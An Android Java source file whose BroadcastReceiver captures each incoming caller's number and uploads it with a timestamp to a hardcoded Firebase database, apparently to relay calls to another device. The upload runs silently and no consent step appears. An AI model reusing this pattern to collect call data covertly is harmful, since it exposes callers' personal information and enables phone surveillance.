package com.cdma.gsm.call;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;

public class CallReceiver extends BroadcastReceiver {
    
    private static final String TAG = "CallReceiverCloud";
    private static final String DB_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        if (TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(action)) {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            
            if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
                // جلب الرقم الوارد
                String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                
                // فلترة مبدئية: إذا كان الرقم null أو مخفي، لا نرسله لتجنب إزعاج المستقبل
                if (incomingNumber == null || incomingNumber.isEmpty() || incomingNumber.equals("null")) {
                    Log.w(TAG, "تجاهل الإرسال: رقم مخفي أو غير معروف.");
                    return;
                }

                Log.d(TAG, "تم التقاط رنين (Broadcast): " + incomingNumber);
                
                // الإرسال إلى السحابة فوراً
                sendToFirebase(incomingNumber);
            }
        }
    }

    private void sendToFirebase(String number) {
        new Thread(() -> {
            try {
                FirebaseDatabase database = FirebaseDatabase.getInstance(DB_URL);
                DatabaseReference myRef = database.getReference("bridge_signals");

                Map<String, Object> data = new HashMap<>();
                data.put("number", number);
                data.put("type", "CALL");
                data.put("method", "BroadcastReceiver"); // لتمييز مصدر التقاط الرقم
                data.put("timestamp", System.currentTimeMillis());

                // استخدام setValue للتحديث اللحظي
                myRef.setValue(data).addOnSuccessListener(aVoid -> 
                    Log.i(TAG, "تم رفع الرقم إلى Firebase بنجاح: " + number)
                ).addOnFailureListener(e -> 
                    Log.e(TAG, "فشل الرفع للسحابة: " + e.getMessage())
                );

            } catch (Exception e) {
                Log.e(TAG, "خطأ تقني في Firebase: " + e.getMessage());
            }
        }).start();
    }
}
